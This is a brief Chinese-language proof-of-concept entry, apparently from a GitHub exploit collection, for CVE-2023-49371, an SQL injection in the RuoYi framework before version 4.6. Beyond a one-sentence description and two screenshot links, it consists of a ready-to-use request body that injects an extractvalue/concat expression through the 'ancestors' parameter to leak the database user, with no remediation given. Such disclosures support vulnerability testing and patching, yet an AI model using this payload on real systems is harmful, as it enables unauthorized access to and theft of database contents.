## RuoYi4.6.0 SQL注入漏洞CVE-2023-49371

若依在4.6版本之前存在SQL注入漏洞，攻击者通过该漏洞可以进行SQL注入利用，从而获取数据库中的敏感信息

## poc
```
DeptName=1&deptid =100&ParentId=12&Status= 0&ordernum =1&ancestors=0)or(extractvalue(1,concat((select user())))); #
```
![image](https://github.com/wy876/POC/assets/139549762/7c110048-af68-42e5-ba3b-ffb69bb28f17)

![image](https://github.com/wy876/POC/assets/139549762/653098c3-5c6d-45a9-b50a-850b48475662)
